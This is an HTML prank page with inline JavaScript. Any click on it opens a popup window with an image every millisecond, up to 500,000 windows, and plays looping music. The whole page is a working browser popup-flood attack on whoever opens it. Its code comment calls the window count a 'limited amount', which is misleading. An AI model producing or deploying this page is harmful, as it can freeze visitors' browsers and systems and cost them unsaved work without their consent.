<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>goe ju</title>
</head>
<body>

  <audio id="music" loop>
    <source src="music.mp3" type="audio/mpeg">
  </audio>

  <script>
    window.addEventListener("click", function() {

      const music = document.getElementById("music");

      // Open small popups immediately (limited amount)
      let count = 0;
      const maxWindows = 500000;

      const interval = setInterval(() => {

        const left = Math.floor(Math.random() * 800);
        const top = Math.floor(Math.random() * 600);

        window.open(
          "theo.jpg",
          "_blank",
          `width=300,height=200,left=${left},top=${top}`
        );

        count++;

        if (count >= maxWindows) {
          clearInterval(interval);
        }

      }, 1);

      // Play looping sound
      music.play().catch(() => {
        console.log("Autoplay blocked by browser.");
      });

    });
  </script>

</body>
</html>
